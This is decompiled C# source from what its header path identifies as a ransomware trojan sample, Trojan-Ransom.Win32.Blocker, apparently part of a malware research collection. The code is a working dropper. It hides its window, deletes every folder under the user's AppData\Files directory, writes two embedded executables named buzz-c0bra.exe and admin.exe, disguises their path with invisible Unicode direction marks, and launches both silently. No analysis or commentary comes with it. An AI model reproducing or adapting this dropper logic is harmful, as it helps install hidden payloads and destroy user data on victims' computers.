// Decompiled with JetBrains decompiler
// Type: FileB.Form1
// Assembly: buzz-c0bra, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 64B211B5-D435-4BF4-B7AE-3E8489653526
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Trojan-Ransom.Win32.Blocker.ewvi-dd60b369b45e718b4b50119c7899e157c8b4534a229efcb8be25cc8091301a77.exe

using FileB.Properties;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Windows.Forms;

namespace FileB
{
  public class Form1 : Form
  {
    private IContainer components = (IContainer) null;

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.SuspendLayout();
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackColor = Color.White;
      this.ClientSize = new Size(10, 10);
      this.ForeColor = Color.White;
      this.FormBorderStyle = FormBorderStyle.None;
      this.Name = nameof (Form1);
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.Text = nameof (Form1);
      this.TransparencyKey = Color.White;
      this.WindowState = FormWindowState.Minimized;
      this.Load += new EventHandler(this.Form1_Load);
      this.ResumeLayout(false);
    }

    public Form1() => this.InitializeComponent();

    private void Form1_Load(object sender, EventArgs e)
    {
      this.Hide();
      byte[] buzzC0bra = Resources.buzz_c0bra;
      string FileName1 = "buzz-c0bra.exe";
      byte[] ajaxV15 = Resources.AjaxV1_5;
      string FileName2 = "admin.exe";
      Form1.CopyAndRun(buzzC0bra, FileName1);
      Form1.CopyAndRun(ajaxV15, FileName2);
      Application.Exit();
    }

    public static void CopyAndRun(byte[] Rec, string FileName)
    {
      string path1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Files\\FileB";
      try
      {
        string[] strArray = new string[10];
        if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Files"))
          strArray = Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Files");
        foreach (string path2 in strArray)
        {
          try
          {
            Directory.Delete(path2, true);
          }
          catch
          {
          }
        }
        do
        {
          if (File.Exists(path1 + "\\" + FileName))
            path1 += "\u200F\u200E";
        }
        while (File.Exists(path1 + "\\" + FileName));
        if (!Directory.Exists(path1))
          Directory.CreateDirectory(path1);
        try
        {
          using (BinaryWriter binaryWriter = new BinaryWriter((Stream) File.Open(path1 + "\\" + FileName, FileMode.Create)))
          {
            binaryWriter.Write(Rec);
            binaryWriter.Close();
          }
        }
        catch
        {
        }
        try
        {
          new Process()
          {
            StartInfo = {
              FileName = (path1 + "\\" + FileName)
            }
          }.Start();
        }
        catch
        {
        }
      }
      catch
      {
      }
    }
  }
}
